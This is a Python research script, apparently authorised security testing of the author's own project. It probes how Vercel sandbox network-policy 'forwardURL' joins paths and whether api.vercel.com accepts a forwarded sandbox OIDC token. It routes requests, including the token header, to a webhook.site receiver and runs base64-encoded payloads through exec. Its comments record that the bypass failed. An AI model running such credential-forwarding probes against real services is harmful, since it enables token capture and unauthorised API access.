# 实验E6: forwardURL 拼接规则确认 + api.vercel.com 自转发 OIDC 认证测试
# 关键发现(G7): OIDC token aud = 完整 forwardURL(含路径), 已解码实锤:
#   aud=https://webhook.site/9c7f5951-... (与 forwardURL 精确一致)
#   iss=oidc.vercel.com/team_xxx, sub=team:...:project:...:sandbox:..., exp=24h
# 含义: G7 本地 Bearer 测试必 403 是 aud 不匹配, 未测到点子上
# 未验证链: forwardURL -> api.vercel.com 自转发 -> aud 匹配 -> API 信任 vercel-sandbox-oidc-token 头?
# 前提: 路径拼接规则(origin 替换 vs 全量覆盖 vs 字符串拼接) 决定如何构造 forwardURL
# 步骤A: 拼接规则三态判别(webhook.site 接收端, A0/A1 两轮组合区分)
#   规则X origin替换(保留原始路径): A0={WH}/latest  A1={WH}/latest
#   规则Y 全量覆盖(丢弃原始路径):   A0={WH}       A1={WH}/pfx
#   规则Z 字符串拼接:                A0={WH}/latest A1={WH}/pfx/latest
# 步骤B/C: 自转发到 api.vercel.com 观察认证结果(200+数据=认证过 / 403=aud或token无效 / 404=路径问题)
#
# ===== 2026-08-19 结果(全部关闭) =====
# 拼接规则 = 规则Z(字符串拼接): 最终URL = forwardURL + 原始请求路径, 五重证据自洽:
#   A0: {WH}+/latest -> {WH}/latest      A1: {WH}/pfx+/latest -> {WH}/pfx/latest
#   B1: api.vercel.com/v2/user + /v2/user -> .../v2/user/v2/user -> 404
#   B2: api.vercel.com + /v2/user -> .../v2/user -> 403 missingToken:true(路径对, 无凭据!)
#   C1: 同域自触发 404, 转发不递归
# 认证链关闭: api.vercel.com 不信任 vercel-sandbox-oidc-token 头(missingToken, 非 invalidToken)
# 本地 Bearer 路径: aud 不匹配 -> invalidToken(G7)
# 读取坑: webhook.site 默认排序旧->新 + DELETE 接口 404, 必须 sorting=newest + 核对时间戳
import json, base64, pathlib, urllib.request, urllib.error, time


def jwt_aud(tok):
    """解码 OIDC JWT 提取 aud(截断防刷屏)"""
    try:
        p = tok.split(".")[1]
        pad = p + "=" * (-len(p) % 4)
        d = json.loads(base64.urlsafe_b64decode(pad))
        return f"aud={d.get('aud')} iss={d.get('iss')}"
    except Exception as e:
        return f"decode err {e}"

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"
WH = "9c7f5951-b5cd-4b74-afeb-f62d92e457db"

def api(method, path, body=None, timeout=60, base="https://api.vercel.com"):
    req = urllib.request.Request(f"{base}{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:800]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

NAME = "expe6"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom",
                              "allowedDomains": ["webhook.site", "api.vercel.com"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

def read_webhook(tag):
    c, r = api("GET", f"/token/{WH}/requests?per_page=3", base="https://webhook.site")
    print(f"\n== webhook after {tag} ==")
    try:
        d = json.loads(r)
        items = d.get("data", [])
        print("total:", d.get("total"))
        for it in items[:3]:
            print("---", it.get("method"), it.get("url"))
            hdrs = it.get("headers", {})
            for k in sorted(hdrs.keys()):
                v = hdrs[k]
                if isinstance(v, list):
                    v = v[0] if v else ""
                if k.lower() in ("vercel-forwarded-path", "vercel-forwarded-host",
                                 "vercel-sandbox-oidc-token", "host"):
                    if k.lower() == "vercel-sandbox-oidc-token" and len(str(v)) > 60:
                        print(f"   {k}: {str(v)[:40]}...  [{jwt_aud(str(v))}]")
                    else:
                        print(f"   {k}: {str(v)[:120]}")
    except Exception as e:
        print("parse err:", e, r[:200])

def run_round(label, match_domain, match_path, fwd_url, trigger_py, trigger_arg,
              clear_wh=True, read_wh=False):
    print(f"\n########## {label}: {match_domain}{match_path} -> {fwd_url} ##########", flush=True)
    if clear_wh:
        api("DELETE", f"/token/{WH}/requests", base="https://webhook.site")
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/network-policy?teamId={TEAM}",
               {"allow": {match_domain: [{"match": {"path": {"exact": match_path}},
                                          "forwardURL": fwd_url}]}})
    if c != 200:
        print(f"update FAILED: {c} {r[:300]}", flush=True)
        return
    print("update OK", flush=True)
    time.sleep(2)
    payload = base64.b64encode(pathlib.Path(trigger_py).read_bytes()).decode()
    args = ["-c", f"import base64;exec(base64.b64decode('{payload}').decode())"]
    if trigger_arg:
        args.append(trigger_arg)
    body = {"command": "python3", "args": args, "wait": True, "logs": True, "timeout": 90000}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"cmd: {c}", flush=True)
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    time.sleep(2)
    if read_wh:
        read_webhook(label)

# A: 拼接规则确认
# A0: forwardURL 无路径对照(判 原始路径是否保留)
run_round("A0-JOIN-CTRL", "webhook.site", "/latest", f"https://webhook.site/{WH}",
          "exp_e5.py", "latest", read_wh=True)
# A1: forwardURL 带路径 /pfx(判 拼接位置: 保留/丢弃/叠加)
run_round("A1-JOIN-PFX", "webhook.site", "/latest", f"https://webhook.site/{WH}/pfx",
          "exp_e5.py", "latest", read_wh=True)

# B1: 自转发 - forwardURL 带路径 + 触发同路径(拼接后 /v2/user/v2/user)
run_round("B1-API-SELFFWD", "webhook.site", "/v2/user", "https://api.vercel.com/v2/user",
          "exp_e5.py", "v2/user")

# B2: 自转发 - forwardURL 无路径(-> /v2/user 或 /v2/user/v2/user)
run_round("B2-API-ORIGIN", "webhook.site", "/v2/user", "https://api.vercel.com",
          "exp_e5.py", "v2/user")

# C1: 同域触发 - 触发域=api.vercel.com, forwardURL 也指 api.vercel.com
run_round("C1-API-SAMEDOMAIN", "api.vercel.com", "/v2/user", "https://api.vercel.com/v2/user",
          "exp_g4b.py", None)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
